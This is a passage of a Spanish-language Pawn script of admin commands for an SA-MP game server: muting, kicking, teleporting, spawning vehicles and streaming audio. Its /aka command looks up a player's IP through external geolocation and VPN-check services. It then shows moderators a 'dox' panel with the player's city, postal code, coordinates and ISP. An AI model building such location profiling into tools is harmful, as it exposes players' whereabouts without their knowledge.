					format(str, sizeof(str), "- {B8B8B8}%s{FFFFFF} tiene ª {F69521}%d{FFFFFF} de ping.", obtenerNick(i), GetPlayerPing(i));
					enviarATodos(numeroMundo, str);
				}
			}
		}
	}
	return 1;
}

CMD:aka(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/aka [id]");
	   	
	new i = strval(params);
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_ROJO, "> No existe la ID que pusiste.");

	new string[160];

	targetID[playerid] = i;

    format(doxJugador[i][IP], 16, obtenerIp(i));

	format(string, sizeof(string), "%s/%s%s", HTTP_IP_API_URL, obtenerIp(i), HTTP_IP_API_END);
	HTTP(playerid, HTTP_GET, string, "", "mostrarAka");

	format(string, sizeof(string), "> Recibiendo informaciÛn del jugador {%06x}%s {C9C9C9}[%s]", colorJugador(i), Jugador[i][Nombre], obtenerIp(i));
	SendClientMessage(playerid, COLOR_NEUTRO, string);

	return 1;
}

public HttpVPNInfo(playerid, response_code, data[])
{
    new vpnstr[64], sdialog[2000];

    if(response_code == 200 || response_code == 400) {
    	new Float:isVPN = floatstr(data);

	 	if(isVPN < 0) {
	 	    new tmp = floatround(isVPN);

			switch(tmp) {
			    case -1: {
			        format(vpnstr, sizeof(vpnstr), "{F74222}Error (No hay entrada)");
			    }
			    case -2: {
			        format(vpnstr, sizeof(vpnstr), "{F74222}Error (IP invÔøΩlido)");
			    }
			    case -3: {
			        format(vpnstr, sizeof(vpnstr), "{F74222}Error (DirecciÔøΩn privada / DirecciÔøΩn no enrutable)");
			    }
			    case -4: {
			        format(vpnstr, sizeof(vpnstr), "{F74222}Error (No se puede acceder a la base de datos)");
			    }
			    case -5: {
			        format(vpnstr, sizeof(vpnstr), "{F74222}Error (Origen del IP baneado)");
			    }
			    case -6: {
			        format(vpnstr, sizeof(vpnstr), "{F74222}Error (InformaciÔøΩn de contacto invÔøΩlido)");
			    }
				default: {
				    format(vpnstr, sizeof(vpnstr), "{F74222}Error (Codigo: %d) (Data: %d)", response_code, tmp);
				}
			}
	 	}
	 	else if(isVPN == 0) {
       		format(vpnstr, sizeof(vpnstr), "{00FF00}No");
	 	}
	 	else if(isVPN > 0 && isVPN < 0.6) {
	 	    format(vpnstr, sizeof(vpnstr), "{209120}Muy improbable");
		}
		else if(isVPN >= 0.6 && isVPN < 0.8) {
		    format(vpnstr, sizeof(vpnstr), "{E8A42E}Probable");
		}
		else if(isVPN >= 0.8 && isVPN < 1) {
		    format(vpnstr, sizeof(vpnstr), "{F7752F}Muy probable");
		}
		else if(isVPN >= 1) {
		    format(vpnstr, sizeof(vpnstr), "{FF0000}Si");
		}
    }
    else {
        format(vpnstr, sizeof(vpnstr), "{F74222}Error (%d)", response_code);
    }
	new str[100];
	format(str, sizeof(str), "{7C7C7C}Par·metro\t{7C7C7C}Valor"); 																	strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Nombre\t{%06x}%s", colorJugador(targetID[playerid]), Jugador[targetID[playerid]][Nombre]); 	strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Estado\t%s", doxJugador[targetID[playerid]][Status]); 										strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}IP\t{FFFFFF}%s", doxJugador[targetID[playerid]][IP]); 										strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}DNS inversa\t{FFFFFF}%s", doxJugador[targetID[playerid]][Reverse]); 					strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Nombre de usuario\t{FFFFFF}%s", doxJugador[targetID[playerid]][As]); 					strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Ciudad\t{FFFFFF}%s", doxJugador[targetID[playerid]][City]); 							strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}PaÌs\t{FFFFFF}%s", doxJugador[targetID[playerid]][Country]); 						strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}CÛdigo de PaÌs\t{FFFFFF}%s", doxJugador[targetID[playerid]][CountryCode]); 			strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}ISP (Empresa de internet)\t{FFFFFF}%s", doxJugador[targetID[playerid]][Isp]); 		strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Latitud\t{FFFFFF}%s", doxJugador[targetID[playerid]][Lat]); 						strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Longitud\t{FFFFFF}%s", doxJugador[targetID[playerid]][Lon]); 						strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Huso horario\t{FFFFFF}%s", doxJugador[targetID[playerid]][TimeZone]); 				strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Org\t{FFFFFF}%s", doxJugador[targetID[playerid]][Org]); 							strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}RegiÛn\t{FFFFFF}%s", doxJugador[targetID[playerid]][Region]); 						strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}Nombre de regiÛn\t{FFFFFF}%s", doxJugador[targetID[playerid]][RegionName]); 		strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}CÛdigo postal\t{FFFFFF}%s", doxJugador[targetID[playerid]][Zip]); 					strcat(sdialog, str);
	format(str, sizeof(str), "\n{7C7C7C}VPN / Proxy\t{FFFFFF}%s", vpnstr); 												strcat(sdialog, str);
	
	ShowPlayerDialog(playerid, 6156, DIALOG_STYLE_TABLIST_HEADERS, "{C7C7C7}InformaciÔÛn", sdialog, "Ok", "");

    return 1;
}

public mostrarAka(playerid, response_code, data[])
{
    if(response_code == 200) {
    	new output[14][64], string[160];

    	strexplode(output, data, ",");
		doxJugador[targetID[playerid]][Status] = output[0];

		if(strfind(output[0], "sucess"))
		    format(doxJugador[targetID[playerid]][Status], 64, "{00FF00}Acceso exitoso");
		else
		    format(doxJugador[targetID[playerid]][Status], 64, "{F74222}Acceso denegado");

		doxJugador[targetID[playerid]][Country] = output[1];
		doxJugador[targetID[playerid]][CountryCode] = output[2];
		doxJugador[targetID[playerid]][Region] = output[3];
		doxJugador[targetID[playerid]][RegionName] = output[4];
		doxJugador[targetID[playerid]][City] = output[5];
		doxJugador[targetID[playerid]][Zip] = output[6];
		doxJugador[targetID[playerid]][Lat] = output[7];
		doxJugador[targetID[playerid]][Lon] = output[8];
		doxJugador[targetID[playerid]][TimeZone] = output[9];
		doxJugador[targetID[playerid]][Isp] = output[10];
		doxJugador[targetID[playerid]][Org] = output[11];
		doxJugador[targetID[playerid]][As] = output[12];
		doxJugador[targetID[playerid]][Reverse] = output[13];

		RemoveChars(targetID[playerid]);

		format(string, sizeof(string), "%s%s", HTTP_VPN_API_URL, doxJugador[targetID[playerid]][IP]);
		HTTP(playerid, HTTP_GET, string, "", "HttpVPNInfo");
    }
    else {
        new string[144];

  		format(string, sizeof(string), "> Error al obtener informaciÛn de la IP (CÛdigo: %d, %s).", response_code, data);
  		SendClientMessage(playerid, COLOR_ROJO, string);
    }
    return 1;
}

stock RemoveChars(tID)
{
    strreplace(doxJugador[tID][Country], "\"", "");
    strreplace(doxJugador[tID][CountryCode], "\"", "");
    strreplace(doxJugador[tID][Region], "\"", "");
    strreplace(doxJugador[tID][RegionName], "\"", "");
    strreplace(doxJugador[tID][City], "\"", "");
    strreplace(doxJugador[tID][Zip], "\"", "");
    strreplace(doxJugador[tID][Lat], "\"", "");
    strreplace(doxJugador[tID][Lon], "\"", "");
    strreplace(doxJugador[tID][TimeZone], "\"", "");
    strreplace(doxJugador[tID][Isp], "\"", "");
    strreplace(doxJugador[tID][Org], "\"", "");
    strreplace(doxJugador[tID][As], "\"", "");
    strreplace(doxJugador[tID][Reverse], "\"", "");

	return 1;
}

CMD:config(playerid, params[]){
	return mostrarMenuConfiguracionPartida(playerid);
}

CMD:configurar(playerid, params[]){
	return mostrarMenuConfiguracionPartida(playerid);
}

CMD:naranja(playerid, params[]){
    new i;
    if(isnull(params))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/naranja ID");
    else
		i = strval(params);

	if(!IsPlayerConnected(i))
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
	    
	if(Equipo[i] == EQUIPO_NARANJA)
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya est‡ en ese Equipo.");

	new texto[300];
	format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ de equipo a {%06x}%s.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), texto);
	moverANaranja(GetPlayerVirtualWorld(playerid), i);
	return 1;
}

CMD:verde(playerid, params[]){
    new i;
    if(isnull(params))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/verde ID");
    else
		i = strval(params);

	if(!IsPlayerConnected(i))
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	if(Equipo[i] == EQUIPO_VERDE)
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya est‡ en ese Equipo.");

	new texto[300];
	format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ de equipo a {%06x}%s.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), texto);
	moverAVerde(GetPlayerVirtualWorld(playerid), i);
	return 1;
}

CMD:espectador(playerid, params[]){
    new i;
    if(isnull(params))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/espectador ID");
    else
		i = strval(params);

	if(!IsPlayerConnected(i))
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	if(Equipo[i] == EQUIPO_ESPECTADOR)
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya est‡ en ese Equipo.");

	new texto[300];
	format(texto, sizeof(texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ de equipo a {%06x}%s.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), texto);
	moverAEspectador(GetPlayerVirtualWorld(playerid), i);
	return 1;
}



CMD:explotar(playerid,params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/explotar ID");
	new i = strval(params), Float:x, Float:y, Float:z;
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
		
 	GetPlayerPos(i, x, y, z);
  	CreateExplosion(x, y, z, 0, 5.0);
   	GameTextForPlayer(i,"~w~Has sido explotado", 2000, 3);
    return 1;
}

CMD:anuncio(playerid, params[])
{
    if(isnull(params)) 
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/anuncio [texto]");
    if(strfind(params, "~k~", true) != -1) 
        return SendClientMessage(playerid, -1, "> Intenta no usar muchos caracteres extraùos.");

    new contador = 0; 
    for(new i=0,j=strlen(params); i<j; i++)
        if(params[i] == '~')
            contador++;

    if((contador % 2) != 0)
        return SendClientMessage(playerid, -1, "> Intenta no usar muchos caracteres extraùos.");

    GameTextForAll(params, 4000, 4);
	return 1;
}

CMD:congelar(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/congelar [id]");
	new i = strval(params);
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
 	if(Jugador[i][Congelado])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador ya esta congelado.");
 	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te autocongeles.");
		
	new str[100];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha congelado a {%06x}%s{C9C9C9}.", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	Jugador[i][Congelado] = true;
    TogglePlayerControllable(i, 0);
	return 1;
}

CMD:descongelar(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/descongelar [id]");
	new i = strval(params);
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
 	if(!Jugador[i][Congelado])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador no esta congelado.");
 	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te autodescongeles..");
		
	new str[100];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha descongelado a {%06x}%s{C9C9C9}.", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	Jugador[i][Congelado] = false;
    TogglePlayerControllable(i, 1);
    return 1;
}

CMD:advertir(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/advertir [id] [razùn]");
	   	
	new i, Razon[64];
	
	if(sscanf(params, "is", i, Razon))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/advertir [id] [razùn]");
	   	
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

 	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te autoadviertes..");
		
	new str[200];
	Jugador[i][Adversion]++;
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha advertido a {%06x}%s{C9C9C9} (%d/3): {FFFFFF}%s", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre], Jugador[i][Adversion], Razon);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	verificarAdvertencias(playerid);
	return 1;
}

stock verificarAdvertencias(playerid){
	if(Jugador[playerid][Adversion] == 3){
		new str[400];
		format(str, sizeof(str), "{%06x}%s{C9C9C9} ha sido expulsado por llegar al maximo de advertencias.", colorJugador(playerid), Jugador[playerid][Nombre]);
		SendClientMessageToAll(COLOR_NEUTRO, str);
	    SetTimerEx("delayKick", 100, false, "i", playerid);
	}
}

CMD:am(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/am [texto]");
	   	
	new str[300];
	format(str, sizeof(str), "[{26BF61}%s{C9C9C9}] {%06x}%s{C9C9C9}: {FFFFFF}%s", obtenerTipoAdmin(Jugador[playerid][Admin]), colorJugador(playerid), Jugador[playerid][Nombre], params);
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	return 1;
}

stock obtenerTipoAdmin(id){
	new s[128];
	if(id == 1)
		format(s, 128, "Moderador");
	if(id == 2)
		format(s, 128, "Moderador global");
	if(id == 3)
		format(s, 128, "Administrador");
	if(id > 3)
		format(s, 128, "DueÒo");
	return s;
}

/* Comandos para administradores nivel 2 (Moderador global)*/
CMD:cc(playerid, params[]){
	new str[300];
	format(str, sizeof(str), "{%06x}%s{C9C9C9} ha borrado el log del chat.", colorJugador(playerid), Jugador[playerid][Nombre]);
	
	borrarLog(GetPlayerVirtualWorld(playerid));
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	return 1;
}

stock borrarLog(numeroMundo){
	ForPlayers(i){
 		if(GetPlayerVirtualWorld(i) == numeroMundo){
 		    for(new j=0;j<30;j++)
 		        SendClientMessage(i, COLOR_NEUTRO, "");
 		}
	}
}

CMD:auto(playerid, params[]){
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/auto [400 - 611]");
	new i = strval(params);

	if(i >  611 || i < 400)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/auto [400 - 611]");
	
	if(vehiculosTotales == 50)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ya se llegÛ al m·ximo de autos, usa /eliminarautos.");

	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	
	Vehiculos[vehiculosTotales] = CreateVehicle(i, x+5, y+5, z, a+90, random(128), random(128), -1);
	SetVehicleVirtualWorld(Vehiculos[vehiculosTotales], GetPlayerVirtualWorld(playerid));
	SetVehicleParamsEx(Vehiculos[vehiculosTotales], 1, 0, 0, 0, 0, 0, 0);
	
	new Texto[400];
	format(Texto, sizeof(Texto), "> {%06x}%s {C9C9C9}ha creado un vehiculo (%d).", colorJugador(playerid), obtenerNick(playerid), i);
	enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
	vehiculosTotales++;
	return 1;
}

CMD:eliminarautos(playerid, params[]){
	for(new i; i<vehiculosTotales; i++)
		DestroyVehicle(Vehiculos[i]);
	new Texto[400];
	format(Texto, sizeof(Texto), "> {%06x}%s {C9C9C9}eliminÛ todos los autos (%d).", colorJugador(playerid), obtenerNick(playerid), vehiculosTotales);
	enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
	vehiculosTotales = 0;
	return 1;
}

CMD:traer(playerid, params[]){
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "Escribiste mal el comando; {FFFFFF}/traer [id]");
	new i = strval(params), Float:x, Float:y, Float:z;
 	
	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te auto-traigas pendejo/a.");
	
	if(Jugador[i][eligiendoMundo])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador esta eligiendo un mundo.");

	if(Duelo[playerid][enCurso])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Primero termina el duelo.");

	if(Duelo[i][enCurso])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador esta en un duelo.");

	if(GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador esta en tu mundo.");
	
	GetPlayerPos(playerid, x, y, z);
 	if(IsPlayerInAnyVehicle(i))
 		SetVehiclePos(i, x+1, y+1, z);
 	else
  		SetPlayerPos(i, x+1, y+1, z);
    new str[128];
    format(str, sizeof(str), "> Has traido a {%06x}%s{FFFFBB}.", colorJugador(i), Jugador[i][Nombre]);
    SendClientMessage(playerid, COLOR_AMARILLO, str);
    format(str, sizeof(str), "{%06x}%s {FFFFBB}te trajo a su posicion.", colorJugador(playerid), Jugador[playerid][Nombre]);
    SendClientMessage(i, COLOR_AMARILLO, str);
    return 1;
}

CMD:ir(playerid, params[]){
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "Escribiste mal el comando; {FFFFFF}/ir [id]");
	new i = strval(params), Float:x, Float:y, Float:z;

 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te hagas el pendejo/a.");
	
	if(Jugador[i][eligiendoMundo])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador esta eligiendo un mundo.");

	if(Duelo[playerid][enCurso])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Primero termina el duelo.");

	if(Duelo[i][enCurso])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador esta en un duelo.");

	if(GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(playerid))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador esta en tu mundo.");
	
	GetPlayerPos(i, x, y, z);
 	if(IsPlayerInAnyVehicle(playerid))
 		SetVehiclePos(playerid, x+1, y+1, z);
 	else
  		SetPlayerPos(playerid, x+1, y+1, z);
    new str[128];
    format(str, sizeof(str), "> Fuiste a la posiciùn de {%06x}%s{FFFFBB}.", colorJugador(i), Jugador[i][Nombre]);
    SendClientMessage(playerid, COLOR_AMARILLO, str);
    format(str, sizeof(str), "> {%06x}%s {FFFFBB}vino a tu posicion.", colorJugador(playerid), Jugador[playerid][Nombre]);
    SendClientMessage(i, COLOR_AMARILLO, str);
    return 1;
}

CMD:mutear(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/mutear [id]");
	new i = strval(params);
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
 	if(Jugador[i][Muteado] == 1)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador ya estù muteado.");
 	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te automutees.");

	new str[100];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha muteado a {%06x}%s{C9C9C9}.", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	Jugador[i][Muteado] = 1;

	return 1;
}

CMD:desmutear(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/desmutear [id]");
	new i = strval(params);
 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
 	if(Jugador[i][Muteado] == 0)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador no estù muteado.");
 	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te autodesmutees..");

	new str[100];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha desmuteado a {%06x}%s{C9C9C9}.", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre]);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	Jugador[i][Muteado] = 0;
    return 1;
}

/* Comandos para Administrador */

CMD:setadmin(playerid, params[]){
	new Nivel, i;
	if(sscanf(params, "ii", i, Nivel))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/setadmin [id] [nivel]");
 	if(!IsPlayerConnected(i))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
 	if(Nivel > 3 || Nivel < 0)
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> m·ximo nivel 3, minimo nivel 0.");
	if(Nivel == Jugador[i][Admin])
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya tiene ese nivel.");

	new str[200];
	Jugador[i][Admin] = Nivel;
	
	if(Nivel == 0)
		format(str, sizeof(str), "{%06x}%s {C9C9C9}le ha quitado nivel admin a {%06x}%s {C9C9C9}(%d{C9C9C9})", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre], Nivel);
	else
		format(str, sizeof(str), "{%06x}%s {C9C9C9}le dio a {%06x}%s{C9C9C9} nivel {FFFFFF}%d {C9C9C9}(%s{FFFFFF}{C9C9C9}).", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre], Nivel, obtenerTipoAdmin(Nivel));

	SendClientMessageToAll(COLOR_NEUTRO, str);
	CallLocalFunction("guardarDatos", "i", i);
	return 1;
}

CMD:kick(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/kick [id] [razÚn]");

	new i, Razon[64];

	if(sscanf(params, "is", i, Razon))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/kick [id] [razùn]");

 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

 	if(i == playerid)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te autokickees..");

	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha kickeado a {%06x}%s{C9C9C9}: {FFFFFF}%s", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre], Razon);
	SendClientMessageToAll(COLOR_NEUTRO, str);
 	SetTimerEx("delayKick", 100, false, "i", i);
	return 1;
}

public delayKick(playerid)
{
    Kick(playerid);
    return 1;
}

CMD:controlcuentas(playerid, params[]){
	return mostrarMenuControlCuentas(playerid);
}

stock mostrarMenuControlCuentas(playerid){
	new Dialogo[1000], string[254];
	format(string, sizeof(string), "{7C7C7C}Habilitar cambio de nombre para un jugador");							strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Habilitar cambio de contraseÒa para un jugador (desactivado)");		strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_CONTROL_CUENTA, DIALOG_STYLE_TABLIST, "{7C7C7C}Control de cuentas", Dialogo, "Elegir", "X");
}

stock mostrarActivarNombre(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la {26BF61}ID {FFFFFF}del jugador que quieras activar su cambio de nombre.");
	return ShowPlayerDialog(playerid, D_MENU_CONTROL_CUENTA_ANOMBRE, DIALOG_STYLE_INPUT, "{7C7C7C}Habilitar cambio de nombre", str , ">>", "X");
}

CMD:gm(playerid, params[]){
    if(Jugador[playerid][vidaInfinita] == false){
        SetPlayerHealth(playerid, Float:0x7F800000);
        Jugador[playerid][vidaInfinita] = true;
        SendClientMessage(playerid, COLOR_ROJO, "> Activaste la vida infinita.");
    }else if(Jugador[playerid][vidaInfinita] == true){
        SetPlayerHealth(playerid, 100);
        Jugador[playerid][vidaInfinita] = false;
        SendClientMessage(playerid, COLOR_ROJO, "> Desactivaste la vida infinita.");
    }
    return 1;
}

CMD:lechero(playerid, params[]){
    new str[200];
	if(lecheroBot == false){
		format(str, sizeof(str), "{%06x}%s {C9C9C9}ha activado a {FFFFFF}Lechero", colorJugador(playerid), Jugador[playerid][Nombre]);
		lecheroBot = true;
	}else if(lecheroBot == true){
		format(str, sizeof(str), "{%06x}%s {C9C9C9}ha desactivado a {FFFFFF}Lechero", colorJugador(playerid), Jugador[playerid][Nombre]);
		lecheroBot = false;
	}
	SendClientMessageToAll(COLOR_NEUTRO, str);
	return 1;
}

CMD:antifake(playerid, params[]){
    new str[200];
	if(antiFake == false){
		format(str, sizeof(str), "{%06x}%s {C9C9C9}ha activado el antifake.", colorJugador(playerid), Jugador[playerid][Nombre]);
		antiFake = true;
	}else if(antiFake == true){
		format(str, sizeof(str), "{%06x}%s {C9C9C9}ha desactivado el antifake.", colorJugador(playerid), Jugador[playerid][Nombre]);
		antiFake = false;
	}
	SendClientMessageToAll(COLOR_NEUTRO, str);
	return 1;
}

CMD:gravedad(playerid, params[]){
	if(!esFloat(params))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Tenes que poner un valor decimal.");
    //0.008
    SetGravity(floatstr(params));
	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}cambiÛ la gravedad de todo el servidor a {FFFFFF}%.3f", colorJugador(playerid), Jugador[playerid][Nombre], floatstr(params));
	SendClientMessageToAll(COLOR_NEUTRO, str);
	SendClientMessage(playerid, COLOR_AMARILLO, "> Por si te olvidas, la gravedad normal es 0.008 :)");
	return 1;
}

CMD:hablar(playerid, params[]){
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/hablar [texto]");
		
	new str[200], http[200];
	format(http, sizeof(http), "http://audio1.spanishdict.com/audio?lang=es&voice=Duardo&speed=10&text=%s", params);
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha enviado un mensaje de voz a todos.", colorJugador(playerid), Jugador[playerid][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	enviarMensajeDeVoz(GetPlayerVirtualWorld(playerid), http);
	return 1;
}

CMD:reproducir(playerid, params[]){
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/reproducir [texto]");
		
	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha puesto una canciÛn para todos.", colorJugador(playerid), Jugador[playerid][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	enviarMensajeDeVoz(GetPlayerVirtualWorld(playerid), params);
	return 1;
}

stock enviarMensajeDeVoz(numeroMundo, mensaje[]){
	ForPlayers(i)
	    if(GetPlayerVirtualWorld(i) == numeroMundo){
			StopAudioStreamForPlayer(i);
			PlayAudioStreamForPlayer(i, mensaje, 0, 0, 0, 0, 0);
		}
}

CMD:ban(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/ban [id] [razÛn]");

	new i, Razon[64];

	if(sscanf(params, "is", i, Razon))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/ban [id] [razÛn]");

 	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

 	if(i == playerid)
